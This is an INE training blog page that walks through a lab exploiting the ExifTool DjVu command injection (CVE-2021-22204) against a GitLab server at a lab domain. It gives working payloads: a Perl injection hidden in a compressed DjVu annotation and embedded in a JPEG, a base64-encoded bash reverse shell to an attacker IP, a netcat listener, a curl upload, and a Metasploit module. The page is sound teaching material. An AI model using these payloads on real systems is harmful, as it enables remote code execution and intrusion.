<!DOCTYPE html><html lang="en"><head><meta charSet="utf-8" data-next-head=""/><meta name="twitter:site" content="@ine" data-next-head=""/><meta property="og:locale" content="en_IE" data-next-head=""/><meta property="og:site_name" content="INE" data-next-head=""/><meta name="viewport" content="width=device-width, initial-scale=1" data-next-head=""/><script type="application/ld+json" async="" defer="" data-next-head="">{"@context":"https://schema.org","@type":"NewsArticle","mainEntityOfPage":{"@type":"WebPage","@id":"https://ine.com//blog/exiftool-command-injection-cve-2021-22204"},"headline":"ExifTool Command Injection (CVE-2021-22204)","image":["https://us-east-1.graphassets.com/AwCYQkwjSUCbfkm08Ct1Mz/gsAwx7B3Rj6BZUQxD95y"],"datePublished":"","dateModified":"","author":{"@type":"Person","name":"INE","url":"https://ine.com"},"publisher":{"@type":"Organization","name":"INE, Inc.","logo":{"@type":"ImageObject","url":"https://ine.com/_next/image?url=%2Fassets%2Flogos%2FINE-Logo-Orange-White-Revised.svg"}}}</script><title data-next-head="">ExifTool Command Injection (CVE-2021-22204) | INE Internetwork Expert</title><meta name="robots" content="index,follow" data-next-head=""/><meta name="description" content="This exercise is to understand how to exploit the vulnerable ExifTool utility using the malicious file.┬á" data-next-head=""/><meta name="twitter:card" content="summary_large_image" data-next-head=""/><meta property="og:title" content="ExifTool Command Injection (CVE-2021-22204)" data-next-head=""/><meta property="og:description" content="This exercise is to understand how to exploit the vulnerable ExifTool utility using the malicious file.┬á" data-next-head=""/><meta property="og:url" content="https://ine.com/blog/exiftool-command-injection-cve-2021-22204" data-next-head=""/><meta property="og:type" content="website" data-next-head=""/><meta property="og:image" content="https://us-east-1.graphassets.com/AwCYQkwjSUCbfkm08Ct1Mz/gsAwx7B3Rj6BZUQxD95y" data-next-head=""/><meta property="og:image:alt" content="ExifTool Command Injection (CVE-2021-22204)" data-next-head=""/><meta property="og:image:width" content="1200" data-next-head=""/><meta property="og:image:height" content="630" data-next-head=""/><meta property="og:image" content="https://ine.com/og-index-image.png" data-next-head=""/><link rel="canonical" href="https://ine.com/blog/exiftool-command-injection-cve-2021-22204" data-next-head=""/><script type="application/ld+json" async="" defer="" data-next-head="">{"@context":"https://schema.org","@type":"EducationalOrganization","name":"INE, Inc.","alternateName":"Internetwork Expert","url":"https://ine.com","logo":"https://ine.com/og-image.png","contactPoint":{"@type":"ContactPoint","telephone":"+18772248987","contactType":"customer service","contactOption":"TollFree","areaServed":"US","availableLanguage":"en"},"sameAs":["https://www.facebook.com/inetraining","https://twitter.com/ine","https://www.instagram.com/inetraining","https://www.youtube.com/user/INEtraining","https://www.linkedin.com/company/inetraining"]}</script><link rel="preload" href="https://cdn.linearicons.com/free/1.0.0/icon-font.min.css" as="style"/><link rel="preconnect" href="https://fonts.googleapis.com"/><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"/><link href="https://fonts.googleapis.com/css2?family=Lato:ital,wght@0,100;0,300;0,400;0,700;0,900;1,100;1,300;1,400;1,700;1,900&amp;display=swap" rel="stylesheet"/><link rel="preconnect" href="https://js.hscta.net"/><link rel="preconnect" href="https://no-cache.hubspot.com"/><link rel="preconnect" href="https://www.gstatic.com" crossorigin="anonymous"/><link rel="preconnect" href="https://connect.facebook.net" crossorigin="anonymous"/><link rel="dns-prefetch" href="https://www.gstatic.com"/><link rel="dns-prefetch" href="https://connect.facebook.net"/><noscript><link rel="stylesheet" href="https://cdn.linearicons.com/free/1.0.0/icon-font.min.css"/></noscript><script async="" defer="">(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
})(window,document,'script','dataLayer','GTM-T3FRMBG');</script><script type="text/javascript" id="hs-script-loader" async="" defer="" src="//js.hs-scripts.com/45160067.js"></script><script id="hs-cta-script" src="//js.hscta.net/cta/current.js" async="" defer=""></script><link rel="preload" href="/_next/static/css/24dfb0d8ec5ef2d4.css" as="style"/><link rel="stylesheet" href="/_next/static/css/24dfb0d8ec5ef2d4.css" data-n-g=""/><link rel="preload" href="/_next/static/css/f1d987d9326fb657.css" as="style"/><link rel="stylesheet" href="/_next/static/css/f1d987d9326fb657.css" data-n-p=""/><link rel="preload" href="/_next/static/css/0eb6b79e2bdee4ba.css" as="style"/><link rel="stylesheet" href="/_next/static/css/0eb6b79e2bdee4ba.css" data-n-p=""/><noscript data-n-css=""></noscript><script defer="" nomodule="" src="/_next/static/chunks/polyfills-42372ed130431b0a.js"></script><script src="/_next/static/chunks/webpack-73c202d500686ac1.js" defer=""></script><script src="/_next/static/chunks/framework-97862ef36bc4065f.js" defer=""></script><script src="/_next/static/chunks/main-1f2f9b217a5bf167.js" defer=""></script><script src="/_next/static/chunks/pages/_app-500496d436d2e825.js" defer=""></script><script src="/_next/static/chunks/1449-0b1283075496b39e.js" defer=""></script><script src="/_next/static/chunks/7554-628e61454948d6a9.js" defer=""></script><script src="/_next/static/chunks/4928-3c98bd12d20fc546.js" defer=""></script><script src="/_next/static/chunks/pages/blog/%5Bslug%5D-ab1b5af489019554.js" defer=""></script><script src="/_next/static/y3bMFBnhp87rJyTJucmbR/_buildManifest.js" defer=""></script><script src="/_next/static/y3bMFBnhp87rJyTJucmbR/_ssgManifest.js" defer=""></script></head><body><div id="__next"><div class="layout"><nav class="styles_navbar__95tl7"><button class="styles_toggleNavButton__SLu38 styles_toggleNavButtonClose__dxABh"></button><a class="styles_logoWrapper__0bYeh" href="/"><img alt="INE | Cybersecurity Official Training &amp; Certifications" loading="lazy" width="150" height="50" decoding="async" data-nimg="1" class="styles_logo__0k0Bk" style="color:transparent" src="/assets/logos/INE-Logo-Orange-White-Revised.svg"/></a><div class="styles_contentWrapper__iRVQk"><div class="styles_leftColumn__2yC2k"><ul class="styles_linkList__L1KiX"><li class="styles_linkListItem__zrx_S"><a class="styles_link__4Xp8g" href="/why-ine">Why INE?</a></li><li class="styles_linkListItem__zrx_S"><button class="styles_link__4Xp8g">Training</button></li><li class="styles_linkListItem__zrx_S"><button class="styles_link__4Xp8g">Certifications</button></li><li class="styles_linkListItem__zrx_S"><button class="styles_link__4Xp8g">Enterprise</button></li><li class="styles_linkListItem__zrx_S"><button class="styles_link__4Xp8g">Resources</button></li><li class="styles_linkListItem__zrx_S"><button class="styles_link__4Xp8g">Pricing &amp; Plans</button></li><li class="styles_linkListItem__zrx_S"><button class="styles_link__4Xp8g">Company</button></li></ul></div><ul class="styles_actionList__harV4"><li class="styles_actionListItem__5bFHv"><a class="button button--small button--tertiary !text-body-xs styles_action__S4lLb" target="_blank" rel="noopener noreferrer" title="Opens in new tab" href="https://my.ine.com/">Sign In</a></li><li class="styles_actionListItem__5bFHv"><a class="button button--small button--secondary !text-body-xs styles_action__S4lLb" target="_blank" rel="noopener noreferrer" title="Opens in new tab" href="https://learn.ine.com/schedule-a-demo">Schedule a Demo</a></li></ul></div><div class="styles_navMenu__rGLB6"><div class="styles_pageWrapper__E_k5a"><ul class="styles_menuItemList__FIWck"><li class="styles_menuItem__EInJ_"><a class="text text--h3 styles_link__4Xp8g" href="/why-ine">Why INE?</a></li><li class="styles_menuItem__EInJ_"><button class="text text--h3 styles_link__4Xp8g">Training<svg class="styles_chevron__81CV0" width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" role="presentation"><path d="M6 9L12 15L18 9" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></path></svg></button></li><li class="styles_menuItem__EInJ_"><button class="text text--h3 styles_link__4Xp8g">Certifications<svg class="styles_chevron__81CV0" width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" role="presentation"><path d="M6 9L12 15L18 9" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></path></svg></button></li><li class="styles_menuItem__EInJ_"><button class="text text--h3 styles_link__4Xp8g">Enterprise<svg class="styles_chevron__81CV0" width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" role="presentation"><path d="M6 9L12 15L18 9" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></path></svg></button></li><li class="styles_menuItem__EInJ_"><button class="text text--h3 styles_link__4Xp8g">Resources<svg class="styles_chevron__81CV0" width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" role="presentation"><path d="M6 9L12 15L18 9" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></path></svg></button></li><li class="styles_menuItem__EInJ_"><button class="text text--h3 styles_link__4Xp8g">Pricing &amp; Plans<svg class="styles_chevron__81CV0" width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" role="presentation"><path d="M6 9L12 15L18 9" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></path></svg></button></li><li class="styles_menuItem__EInJ_"><button class="text text--h3 styles_link__4Xp8g">Company<svg class="styles_chevron__81CV0" width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" role="presentation"><path d="M6 9L12 15L18 9" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></path></svg></button></li></ul><ul class="styles_actionList__harV4"><li class="styles_actionListItem__5bFHv"><a class="button button--small button--tertiary !text-body-xs styles_action__S4lLb" target="_blank" rel="noopener noreferrer" title="Opens in new tab" href="https://my.ine.com/">Sign In</a></li><li class="styles_actionListItem__5bFHv"><a class="button button--small button--secondary !text-body-xs styles_action__S4lLb" target="_blank" rel="noopener noreferrer" title="Opens in new tab" href="https://learn.ine.com/schedule-a-demo">Schedule a Demo</a></li></ul></div></div></nav><div class="styles_megaNav__NiMbG"><div class="styles_megaNavContentWrapper__oV3B_"><ul class="styles_megaNavItemList__azc_s"></ul></div></div><main class="w-full bg-white default-layout dark-background"><section class="styles_BlogDetailContainer__S9bk0"><div class="styles_breadcrumb__nj3nU styles_breadcrumb__gf1Wl"><svg class="styles_backArrow__chJOG" width="17" height="15" viewBox="0 0 17 15" fill="none" xmlns="http://www.w3.org/2000/svg" role="presentation"><path d="M1.25 7.27441L16.25 7.27441" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"></path><path d="M7.2998 13.2988L1.2498 7.27476L7.2998 1.24976" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"></path></svg><a class="text text--label-small styles_breadcrumbItem__Q0ERW" href="/resources">Resources</a><div class="text text--label-small styles_breadcrumbItem__Q0ERW">ExifTool Command Injectio ...</div></div><section class="mx-auto mb-[100px] mt-[80px] w-[715px] text-center"><div><span class="text-tag uppercase text-[#fff]">21 September 22</span></div><h1 class="mb-[30px] text-h1 font-black text-[#fff]">ExifTool Command Injection (CVE-2021-22204)</h1><div><span class="mr-4 text-body-xs font-bold text-[#BBBCC7]">Posted by</span><span class="text-body-xs font-bold text-[#797B8C]">INE</span></div><div class="min-h-[250px]"><img src="https://us-east-1.graphassets.com/AwCYQkwjSUCbfkm08Ct1Mz/gsAwx7B3Rj6BZUQxD95y" class="mt-[70px] rounded-2xl" alt="news-featured"/></div></section><section class="bg-[#E9E9ED] pb-[120px]"><div class="mx-auto w-[715px]"><div class="mt-[-300px] w-full pt-[200px]"><div class="prose my-[40px] max-w-[100%] text-body-2 font-medium text-[#2C2C31]"><p><em>In our lab walkthrough series, we go through selected lab exercises on our┬áINE Platform. </em><a rel="noopener ugc nofollow" class="au kd" target='_blank' title="https://ine.com/pricing" href="https://ine.com/pricing"><em>Subscribe</em></a> or <em>sign up for a┬á</em><a target='_blank' title="https://checkout.ine.com/free-trial" href="https://checkout.ine.com/free-trial"><em>7-day, risk-free trial with INE</em></a><em> and access this lab and a robust library covering the latest in Cyber Security, Networking, Cloud, and Data Science!</em></p><p><strong>Purpose:┬á</strong>We are learning how to manually exploit the Gitlab server running the ExifTool vulnerable version to better understand the vulnerability. Also, we will use Metasploit Framework to generate a malicious image that gives us a meterpreter session.</p><p><strong>Technical difficulty:┬á</strong>Beginner</p><h4><strong>Introduction</strong></h4><p>In 2021, a critical vulnerability was found in the ExifTool tool. The ExifTool is used in many significant applications such as Gitlab. Gitlab uses this tool as a dependency for their product. One issue in the Gitlab lab was exploited due to a vulnerability found in the ExifTool tool. Improper neutralization of user data in the DjVu file format in ExifTool versions 7.44 and up allows arbitrary code execution when parsing the malicious image. Many python scripts and a Metasploit module are available to generate the malicious image file.</p><p>The vulnerability severity base score is┬á<strong>7.8</strong>.</p><p>In this lab, we targeted the Gitlab server, where the git server was not correctly validating image files passed to a file parser, resulting in remote command execution.</p><p>The CVE assigned to this vulnerability is<strong> CVE-2021-22204</strong>.</p><p><strong>Lab Environment</strong></p><p>In this lab environment, the user will access a Kali GUI instance. A vulnerable machine GitLab server deployed on http://demo.ine.local.┬á</p><p><strong>Goal after completing this scenario:</strong> Exploit the Gitlab server using a malicious .jpg image and gain the shell. Then read the flag.</p><img src="https://us-east-1.graphassets.com/AwCYQkwjSUCbfkm08Ct1Mz/3RWR21RSxaBwfLxdvBqU" alt="ExifTool_0.png" title="ExifTool_0.png" width="862" height="361" /><p><strong>Tools</strong></p><p><strong>The best tools for this lab are:</strong></p><p>- Nmap</p><p>- Bash Shell</p><p>- ExifTool</p><p>- Metasploit Framework</p><p><strong>Lab Link:┬á</strong><a title="https://my.ine.com/INE/courses/ebd09929/cyber-security-vulnerabilities-training-library/lab/4519c8c3-a525-48d6-bf74-6ea5701bfc48" href="https://my.ine.com/INE/courses/ebd09929/cyber-security-vulnerabilities-training-library/lab/4519c8c3-a525-48d6-bf74-6ea5701bfc48"><u><strong>https://my.ine.com/INE/courses/ebd09929/cyber-security-vulnerabilities-training-library/lab/4519c8c3-a525-48d6-bf74-6ea5701bfc48</strong></u></a><strong>┬á</strong></p><img src="https://us-east-1.graphassets.com/AwCYQkwjSUCbfkm08Ct1Mz/pOX942EbTASlP8iCdgXa" alt="ExifTool_0_1.jpg" title="ExifTool_0_1.jpg" width="1920" height="961" /><p>Please go ahead ONLY if you have COMPLETED the lab or you are stuck! Checking the solutions before actually trying the concepts and techniques you studied in the course will dramatically reduce the benefits of a hands-on lab!</p><p><strong>What is GitLab?</strong></p><p>GitLab Community Edition (CE) is an open-source end-to-end software development platform with built-in version control, issue tracking, code review, CI/CD, and more. Self-host GitLab CE on your own servers, in a container, or on a cloud provider.</p><p>On April 14, 2021, GitLab published a security release to address CVE-2021-22205, a critical remote code execution vulnerability in the service&#39;s web interface. At the time, GitLab described the issue as an authenticated vulnerability that was the result of passing user-provided images to the service&#39;s embedded version of ExifTool. A remote attacker could execute arbitrary commands as the git user due to ExifTool&#39;s mishandling of DjVu files, an issue that was later assigned CVE-2021-22204.</p><p>In this lab, we are focused on exploiting<strong> CVE-2021-22204</strong></p><p><strong>Affected products</strong></p><p>GitLab&#39;s April 2021 advisory affects all versions of both GitLab Enterprise Edition (EE) and GitLab Community Edition (CE) starting from 11.9. The vulnerability was patched in the following versions:</p><p>- 13.10.3</p><p>- 13.9.6</p><p>- 13.8.8</p><p><strong>Source:┬á</strong>https://attackerkb.com/topics/D41jRUXCiJ/cve-2021-22205/rapid7-analysis?referrer=activityFeed</p><p><strong>What is ExifTool?</strong></p><p>ExifTool is a free and open-source software program for reading, writing, and manipulating image, audio, video, and PDF metadata. It is platform-independent, available as both a Perl library (Image::ExifTool) and command-line application. ExifTool is commonly incorporated into different types of digital workflows and supports many types of metadata including Exif, IPTC, XMP, JFIF, GeoTIFF, ICC Profile, Photoshop IRB, FlashPix, AFCP and ID3, as well as the manufacturer-specific metadata formats of many digital cameras.</p><p><strong>Source</strong>: https://en.wikipedia.org/wiki/ExifTool</p><p><strong>What is Djvu?</strong></p><p>Djvu is a computer file format designed primarily to store scanned documents, especially those containing a combination of text, line drawings, indexed color images, and photographs. It uses technologies such as image layer separation of text and background/images, progressive loading, arithmetic coding, and lossy compression for bitonal (monochrome) images. This allows high-quality, readable images to be stored in a minimum of space, so that they can be made available on the web.</p><p><strong>Source:</strong> https://en.wikipedia.org/wiki/DjVu</p><p>For vulnerability analysis, we highly recommend you to please refer to this blog post written by [convisoappsec](https://blog.convisoappsec.com/en/a-case-study-on-cve-2021-22204-exiftool-rce/)</p><h3><strong>Solution</strong></h3><p><strong>Step 1:</strong> Open the lab link to access the Kali machine.</p><p><strong>Kali machine</strong></p><img src="https://us-east-1.graphassets.com/AwCYQkwjSUCbfkm08Ct1Mz/lAjdJ2oQ8KjrcqVWzn2E" alt="ExifTool_1.png" title="ExifTool_1.png" width="2560" height="1375" /><p><strong>Step 2:</strong> Check if the provided machine/domain is reachable.</p><p><strong>Command</strong></p><p>ping -c 4 demo.ine.local</p><img src="https://us-east-1.graphassets.com/AwCYQkwjSUCbfkm08Ct1Mz/yQz0givnQB6OJllrPdy6" alt="ExifTool_2.jpg" title="ExifTool_2.jpg" width="1040" height="320" /><p>The provided machine is reachable, and we also found the target&#39;s IP address.</p><p><strong>Step 3:┬á</strong>Check all open ports on the machine.</p><p><strong>Command</strong></p><p>nmap demo.ine.local</p><img src="https://us-east-1.graphassets.com/AwCYQkwjSUCbfkm08Ct1Mz/NP7KqcKWTqyYryUZSxfM" alt="ExifTool_3.jpg" title="ExifTool_3.jpg" width="900" height="325" /><p>Multiple ports are open. The GitLab server is running on port 80.</p><p><strong>Step 4:┬á</strong>Run the firefox browser and access port 80 to identify the GitLab server.</p><p><strong>URL:</strong> http://demo.ine.loca</p><img src="https://us-east-1.graphassets.com/AwCYQkwjSUCbfkm08Ct1Mz/WzZIOtmcRn2SjQvu2wep" alt="ExifTool_4.jpg" title="ExifTool_4.jpg" width="1920" height="961" /><p><br>The target is running the Gitlab server.</p><p></p><h3><strong>Exploiting Manually</strong></h3><p><strong>Step 5:</strong> </p><p>We will manually exploit the vulnerability by generating the malicious .jpg image.</p><p>To trigger the vulnerable function, we need to create a valid DjVu file that contains an annotation chunk with the payload that will be executed by the eval function as Perl code. To create this valid DjVu file, we used the tool djvumake , from the [djvulibre](http://djvu.sourceforge.net/) toolkit. A toolkit for DjVu file manipulation. We will also use the tool bzz to compress our payload, then it will not be easily visible in the DjVu file. (in case someone try to inspect it)</p><p>Source: https://blog.convisoappsec.com/en/a-case-study-on-cve-2021-22204-exiftool-rce/</p><p>We will generate a malicious .jpg file on the Kali machine. A vulnerable ExifTool application is installed on the Kali machine to understand how the exploit/vulnerability is working.┬á</p><p>First, we will try on the Kali machine; then, we will exploit Gitlab, which is using a vulnerable version of ExifTool.┬á</p><p>Create a payload file with the below content in it.</p><p><strong>Payload:</strong> (metadata &quot;\c${system(&#39;id&#39;)};&quot;)</p><p><strong>Commands:</strong></p><p>nano payload</p><p>cat payload</p><img src="https://us-east-1.graphassets.com/AwCYQkwjSUCbfkm08Ct1Mz/nqNGVJ8ZSq26qTR54O7O" alt="ExifTool_5.jpg" title="ExifTool_5.jpg" width="442" height="117" /><p>Compress the payload file to make it non-human-readable</p><p><strong>Command:</strong></p><p>bzz payload payload.bzz</p><img src="https://us-east-1.graphassets.com/AwCYQkwjSUCbfkm08Ct1Mz/Btzr7XvMRVSddwikcu27" alt="ExifTool_5_1.jpg" title="ExifTool_5_1.jpg" width="509" height="125" /><p>Making .djvu file using djvumake utility.</p><p><strong>Command:</strong></p><p>djvumake exploit.djvu INFO=&#39;1,1&#39; BGjp=/dev/null ANTz=payload.bzz</p><p>file exploit.djvu</p><p><strong>INFO┬á</strong>= Anything in the format &#39;N,N&#39; where N is a number</p><p><strong>BGjp┬á</strong>= Expects a JPEG image, but we can use /dev/null to use nothing as a background image</p><p><strong>ANTz┬á</strong>= Will write the compressed annotation chunk with the input file</p><img src="https://us-east-1.graphassets.com/AwCYQkwjSUCbfkm08Ct1Mz/xEgqIObjQRixFFalprWO" alt="ExifTool_5_2.jpg" title="ExifTool_5_2.jpg" width="1074" height="126" /><p>We have successfully generated the malicious .djvu file that will execute┬á<strong>id┬á</strong>command when someone tries to analyze it with the ExifTool tool.</p><p>We are running ExifTool to check the malicious file behavior.</p><p><strong>Command:</strong></p><p>exiftool exploit.djvu┬á</p><img src="https://us-east-1.graphassets.com/AwCYQkwjSUCbfkm08Ct1Mz/T7lY2IIYTPO8tGWH2BkR" alt="ExifTool_5_3.jpg" title="ExifTool_5_3.jpg" width="840" height="624" /><p>As we can notice, we have successfully executed the command id while analyzing the exploit.djvu file using the ExifTool tool. This confirms that ExifTool version 12.23 is vulnerable to Command Injection vulnerability.</p><p><strong>Step 6:</strong> Let&#39;s exploit the GitLab server.</p><p>We will again generate another malicious .djvu file. But, this time, we are exploiting the Gitlab server. It doesn&#39;t support .djvu format file. We need an image file.┬á</p><p>We can easily create a .djvu file to .jgp using the below config file.</p><pre><code>%Image::ExifTool::UserDefined = (
┬á┬á┬á┬áAll EXIF tags are added to the Main table, and WriteGroup is used to
┬á┬á┬á┬áspecify where the tag is written (default is ExifIFD if not specified):
┬á┬á┬á┬á&#39;Image::ExifTool::Exif::Main&#39; =&gt; {
┬á┬á┬á┬á┬á┬á┬á┬áExample 1.┬á EXIF:NewEXIFTag
┬á┬á┬á┬á┬á┬á┬á┬á0xc51b =&gt; {
┬á┬á┬á┬á┬á┬á┬á┬á┬á┬á┬á┬áName =&gt; &#39;HasselbladExif&#39;,
┬á┬á┬á┬á┬á┬á┬á┬á┬á┬á┬á┬áWritable =&gt; &#39;string&#39;,
┬á┬á┬á┬á┬á┬á┬á┬á┬á┬á┬á┬áWriteGroup =&gt; &#39;IFD0&#39;,
┬á┬á┬á┬á┬á┬á┬á┬á},
┬á┬á┬á┬á┬á┬á┬á┬áadd more user-defined EXIF tags here...
┬á┬á┬á┬á},
);
1; #end%</code></pre><p>What this file does is make it possible for us to write a new tag on the file with the name HasselbladExif and the bytes 0xc51b to identify it inside our new file. Then we can insert it inside of any file. Then use it and our already made exploit.djvu to insert the malicious DjVu file inside a valid JPEG: https://blog.convisoappsec.com/en/a-case-study-on-cve-2021-22204-exiftool-rce/</p><p>Generating a new .djvu file with Bash reverse shell in it.</p><p>First, let&#39;s check the attacker&#39;s machine IP address.</p><p><strong>Command:</strong></p><p>ip addr</p><img src="https://us-east-1.graphassets.com/AwCYQkwjSUCbfkm08Ct1Mz/9UAcxH1RShuIyaaXMtWd" alt="ExifTool_6.jpg" title="ExifTool_6.jpg" width="1404" height="463" /><p>The attacker machine IP address is: 10.10.27.3.</p><p><strong>Note: In your case, please remember to change the attacker machine IP address</strong></p><p>Bash Reverse Shell: sh -i &gt;&amp; /dev/tcp/10.10.27.3/4444 0&gt;&amp;1</p><p>First, encode the shell in base64 format.</p><p><strong>Command:</strong></p><p>echo &#39;sh -i &gt;&amp; /dev/tcp/10.10.27.3/4444 0&gt;&amp;1&#39; | base64┬á</p><img src="https://us-east-1.graphassets.com/AwCYQkwjSUCbfkm08Ct1Mz/C13Fxen7QvehWLP92VCJ" alt="ExifTool_6_1.jpg" title="ExifTool_6_1.jpg" width="934" height="92" /><p><strong>Payload</strong>: (metadata &quot;\c${system(&#39;echo c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMjcuMy80NDQ0IDA+JjEK | base64 -d | bash&#39;)};&quot;)</p><p><strong>Command:</strong></p><p>nano payload</p><p>cat payload</p><p>bzz payload payload.bzz</p><p>djvumake exploit.djvu INFO=&#39;1,1&#39; BGjp=/dev/null ANTz=payload.bzz</p><p>file exploit.djvu</p><img src="https://us-east-1.graphassets.com/AwCYQkwjSUCbfkm08Ct1Mz/NtQByZ2STpKxGOLdNOOS" alt="ExifTool_6_2.jpg" title="ExifTool_6_2.jpg" width="1485" height="230" /><p>Now, converting the .djvu file into .jgp</p><p><strong>Command:</strong></p><p>cat configfile</p><p>cp /usr/share/wallpaper.jpg .</p><p>exiftool -config configfile &#39;-HasselbladExif&lt;=exploit.djvu&#39; wallpaper.jpg</p><p>configfile = The name of our configuration file;</p><p>-HasselbladExif = Tag name that are specified in the config file;</p><p>exploit.djvu = Our exploit, previously made with djvumake;</p><p>wallpaper.jpg = A valid JPEG file;</p><img src="https://us-east-1.graphassets.com/AwCYQkwjSUCbfkm08Ct1Mz/oDaeclI1Qxy2Zt8EGdkc" alt="ExifTool_6_3.jpg" title="ExifTool_6_3.jpg" width="1220" height="569" /><p>Start the netcat listener on port 4444</p><p><strong>Command:</strong></p><p>nc -lvp 4444</p><img src="https://us-east-1.graphassets.com/AwCYQkwjSUCbfkm08Ct1Mz/NDUIQtNTn2eAwRjCWUyg" alt="ExifTool_6_4.jpg" title="ExifTool_6_4.jpg" width="630" height="150" /><p>Send the payload to gain the bash shell.</p><p><strong>Command:</strong></p><p>curl -v -F &#39;file=@/root/wallpaper.jpg&#39; http://demo.ine.local/$(openssl rand -hex 8)</p><img src="https://us-east-1.graphassets.com/AwCYQkwjSUCbfkm08Ct1Mz/D93WWplSTWUOuhvFnjMA" alt="ExifTool_6_5.jpg" title="ExifTool_6_5.jpg" width="962" height="268" /><p></p><img src="https://us-east-1.graphassets.com/AwCYQkwjSUCbfkm08Ct1Mz/8ez1d6e2TIKw13f6laVI" alt="ExifTool_6_6.jpg" title="ExifTool_6_6.jpg" width="681" height="295" /><p><strong>We have received a shell.</strong></p><p><strong>Source:┬á</strong>https://blog.convisoappsec.com/en/a-case-study-on-cve-2021-22204-exiftool-rce/</p><p></p><h3><strong>Exploiting Using Metasploit</strong></h3><p><strong>Step 7:</strong> Metasploit module is available to generate the malicious image. Use the module to generate the malicious image and exploit the Gitlab server manually using curl.</p><p>Start the Metasploit framework and search for the ExifTool exploit module.</p><p><strong>Command:</strong></p><p>msfconsole -q</p><p>search exiftool</p><img src="https://us-east-1.graphassets.com/AwCYQkwjSUCbfkm08Ct1Mz/gBbQ2sEQS82GzfYYPmUC" alt="ExifTool_7.jpg" title="ExifTool_7.jpg" width="1584" height="462" /><p>There is a metasploit module available:┬á<strong>exploit/unix/fileformat/exiftool_djvu_ant_perl_injection</strong></p><p><strong>ExifTool DjVu ANT Perl injection</strong></p><p>This module exploits a Perl injection vulnerability in the DjVu ANT parsing code of ExifTool versions 7.44 through 12.23 inclusive. The injection is used to execute a shell command using Perl backticks. The DjVu image can be embedded in a wrapper image using the HasselbladExif EXIF field.</p><p><strong>Source:┬á</strong>https://www.rapid7.com/db/modules/exploit/unix/fileformat/exiftool_djvu_ant_perl_injection/</p><p>For more understanding about the ExifTool CVE-2021-22204 - Arbitrary Code Execution: Here is an excellent blog post by [William Bowling](https://twitter.com/wcbowling): https://devcraft.io/2021/05/04/exiftool-arbitrary-code-execution-cve-2021-22204.html</p><p>Use the exiftool_djvu_ant_perl_injection exploit module and check all available options.</p><p><strong>Commands:</strong></p><p>use exploit/unix/fileformat/exiftool_djvu_ant_perl_injection</p><p>show options</p><p>All the options are already set. Start the Metasploit handler while generating the malicious image.</p><p>Set┬á<strong>DISABLEPAYLOADHANDLER┬á</strong>to┬á<strong>false,┬á</strong>set┬á<strong>WfsDelay┬á</strong>to┬á<strong>100,┬á</strong>and then run the module.</p><img src="https://us-east-1.graphassets.com/AwCYQkwjSUCbfkm08Ct1Mz/Qk592xqmSHWmlQ30R4j0" alt="ExifTool_7_1.jpg" title="ExifTool_7_1.jpg" width="1232" height="750" /><p>Check the file details.</p><p><strong>Commands:</strong></p><p>set PAYLOAD cmd/unix/reverse_bash</p><p>set DISABLEPAYLOADHANDLER false</p><p>set WfsDelay 100</p><p>exploit</p><p>The image is generated in the /root/.msf4/local/msf.jpg. It&#39;s a JPEG image data with Exif standard.</p><img src="https://us-east-1.graphassets.com/AwCYQkwjSUCbfkm08Ct1Mz/6LnJNfYQDOrw2EUr7S9l" alt="ExifTool_7_2.jpg" title="ExifTool_7_2.jpg" width="1389" height="330" /><p>Note: Make sure that your Metasploit handler is running</p><p>Send the payload to gain the meterpreter session.</p><p><strong>Command:</strong></p><p>curl -v -F &#39;file=@/root/.msf4/local/msf.jpg&#39; http://demo.ine.local/$(openssl rand -hex 8)</p><img src="https://us-east-1.graphassets.com/AwCYQkwjSUCbfkm08Ct1Mz/TK0imYKnT1aBbWEwAQti" alt="ExifTool_7_3.jpg" title="ExifTool_7_3.jpg" width="1332" height="327" /><p><strong>Received the meterpreter session.</strong></p><img src="https://us-east-1.graphassets.com/AwCYQkwjSUCbfkm08Ct1Mz/KQbhFhoQ9iwIfaRMXmrw" alt="ExifTool_7_4.jpg" title="ExifTool_7_4.jpg" width="1453" height="438" /><p><strong>Successfully exploited the target machine.</strong></p><p><strong>Step 8:┬á</strong>Read the flag.</p><p><strong>Commands:</strong></p><p>cd ..</p><p>ls</p><p>cat flag.txt</p><img src="https://us-east-1.graphassets.com/AwCYQkwjSUCbfkm08Ct1Mz/qKMCF2zGQ7m2bImzRFOa" alt="ExifTool_8.jpg" title="ExifTool_8.jpg" width="463" height="710" /><p><strong>FLAG:┬á</strong>7e9b2ed1272331cfbd2aac2e5eb3f84b</p><p><strong>Conclusion:</strong></p><p>We have successfully exploited the Gitlab server abusing exiftoolΓÇÖs vulnerability (ExifToolΓÇÖs mishandling of DjVu files) that allows an attacker to perform a command injection using a malicious image. Gitlab was not correctly validating image files that were passed to a file parser; hence, it is possible to exploit the vulnerability.┬á</p><p><strong>References</strong></p><ol><li><div><p><a title="https://github.com/exiftool/exiftool" href="https://github.com/exiftool/exiftool"><u>ExifTool</u></a></p></div></li><li><div><p><a title="https://about.gitlab.com" href="https://about.gitlab.com"><u>GitLab</u></a></p></div></li><li><div><p><a title="https://packetstormsecurity.com/files/164994/GitLab-13.10.2-Remote-Code-Execution.html" 